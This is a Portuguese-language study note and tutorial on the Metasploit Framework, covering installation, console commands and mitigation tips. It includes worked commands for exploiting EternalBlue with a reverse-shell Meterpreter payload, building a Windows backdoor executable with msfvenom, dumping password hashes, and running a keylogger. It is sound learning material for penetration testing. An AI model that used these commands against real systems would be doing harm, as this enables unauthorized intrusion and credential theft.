
2025-07-27 08:34

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Ferramentas]] | [[Pentest]] | [[Metasploit]]

----
# Introdução

 O **Metasploit Framework** é uma das ferramentas mais poderosas e utilizadas no mundo da segurança cibernética. Desenvolvida pela Rapid7, ele é uma plataforma de **teste de penetração open-source** que permite aos profissionais de segurança identificar, explorar e validar vulnerabilidades em sistemas.

## Principais Características:

- **Banco de exploits** para milhares de vulnerabilidades conhecidas.
- **Payloads** personalizáveis para pós-exploração.
- **Módulos auxiliares** para reconhecimento e enumeração.
- **Integração com outras ferramentas** (Nmap, Nessus, etc.).

![[Pasted image 20250727083712.png]]

---
# Arquitetura do Metasploit

O framework é dividido em componentes principais:

| **Componente**    | **Descrição**                                    |
| ----------------- | ------------------------------------------------ |
| msfconsole        | Interface principal (linha de comando).          |
| Modules           | Exploits, payloads, scanners, etc.               |
| Database          | Armazena resultados de scans e sessões.          |
| Auxiliary         | Funções não-exploits (scanners, sniffers, etc.). |
| Post-Exploitation | Módulos para manter acesso e coletar dados.      |

![[Pasted image 20250727083933.png]]

---
# Instalação do Metasploit

## Linux (Kali Linux)

Já vem pré-instalado. Para atualizar:

```bash
sudo apt update && sudo apt upgrade metasploit-framework
```

## Outras Distribuições Linux

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
```

## Windows

Baixe o instalador em [Metasploit.com](https://www.metasploit.com/).

## MacOS

```bash
brew install metasploit
```

---
# Iniciando o Metasploit

## Iniciar o Banco de Dados

```bash
sudo systemctl start postgresql
sudo msfdb init
```

## Abrir o `msfconsole`

```bash
msfconsole
```

![[Pasted image 20250727084439.png]]

---
# Comandos Básicos do Metasploit


| **Comando**           | **Descrição**                                                            |
| --------------------- | ------------------------------------------------------------------------ |
| `help`                | Lista todos os comandos disponíveis.                                     |
| `search [termo]`      | Procura módulos (ex.: `search eternalblue`).                             |
| `use [módulo]`        | Carrega um módulo (ex.: `use exploit/windows/smb/ms17_010_eternalblue`). |
| `show options`        | Exibe opções configuráveis do módulo.                                    |
| `set [opção] [valor]` | Define parâmetros (ex.: `set RHOSTS 192.168.1.100`)                      |
| `exploit` ou `run`    | Executa o módulo.                                                        |

---
# Exemplos Práticos

## 1. Explorando o EternalBlue (MS17-010)

1. **Buscar o exploit:**

```bash
search eternalblue
```

2. **Selecionar e configurar:**

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50 (seu IP)
```

3. **Explorar:**

```bash
exploit
```

## 2. Criando um Payload com `msfvenom`

Gerar um backdoor para Windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > backdoor.exe
```

## 3. Escalando Privilégios com Meterpreter

Após ganhar acesso:

```bash
meterpreter > getsystem
meterpreter > hashdump
```

---
# Módulos principais

## **7.1 Exploits**

- **Windows**: `exploit/windows/smb/ms17_010_eternalblue`
- **Linux**: `exploit/linux/http/apache_mod_cgi_bash_env_exec`
- **Web**: `exploit/multi/http/wp_admin_shell_upload`

## **7.2 Payloads**

- `reverse_tcp`: Conexão reversa para o atacante.
- `bind_tcp`: Abre uma porta no alvo.
- **Meterpreter**: Payload avançado para Pós-Exploração.

## **7.3 Auxiliary**

- **Scanners**: `auxiliary/scanner/portscan/tcp`
- **Sniffers**: `auxiliary/sniffer/psnuffle`

---
# Pós-Exploração

Com uma sessão Meterpreter ativa:

| **Comando**          | **Descrição**                  |
| -------------------- | ------------------------------ |
| `screenshot`         | Tira um print da tela do alvo. |
| `keyscan_start`      | Inicia keylogger.              |
| `download [arquivo]` | Baixa arquivos do alvo.        |
| `shell`              | Acessa o shell do sistema.     |

---
# Mitigação contra Ataques do Metasploit

- **Atualizar sistemas** regularmente.
- **Usar firewalls** para bloquear portas não essenciais.
- **Monitorar logs** para atividades suspeitas.
- **Desativar serviços desnecessários** (ex.: SMBv1).

---
# Conclusão

O Metasploit é uma ferramenta essencial para:  

✅ **Testes de penetração** em redes e aplicações.  
✅ **Validação de vulnerabilidades** antes de invasores.  
✅ **Treinamento em segurança cibernética**.

> [!warning] **Aviso Legal:**
> 
> - Use apenas em sistemas com permissão.
> - Ataques não autorizados são crimes.     

---
# Referências:

- [Guia Oficial Metasploit](https://www.metasploit.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)